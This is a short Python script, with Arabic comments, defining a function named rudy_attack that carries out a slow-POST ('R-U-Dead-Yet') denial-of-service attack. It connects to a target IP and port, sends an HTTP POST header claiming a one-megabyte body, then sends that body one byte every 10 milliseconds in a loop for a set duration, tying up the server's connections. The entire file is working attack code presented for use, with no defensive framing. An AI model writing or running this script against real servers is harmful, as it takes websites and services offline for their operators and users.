import socket
import time

def rudy_attack(target_ip, target_port, duration):
    timeout = time.time() + duration
    content_length = 1000000  # حجم جسم POST كبير

    print(f"[RUDY] Starting attack on {target_ip}:{target_port} for {duration}s")

    try:
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.settimeout(10)

                s.send(b"POST / HTTP/1.1\r\n")
                s.send(b"Host: " + target_ip.encode() + b"\r\n")
                s.send(b"Content-Length: " + str(content_length).encode() + b"\r\n")
                s.send(b"Content-Type: application/x-www-form-urlencoded\r\n")
                s.send(b"Connection: keep-alive\r\n\r\n")

                for _ in range(content_length):
                    s.send(b"a")
                    time.sleep(0.01)  # إرسال ببطء (10 مللي ثانية بين كل بايت)

                s.close()
            except Exception:
                pass

    except KeyboardInterrupt:
        print("[RUDY] Attack stopped by user.")
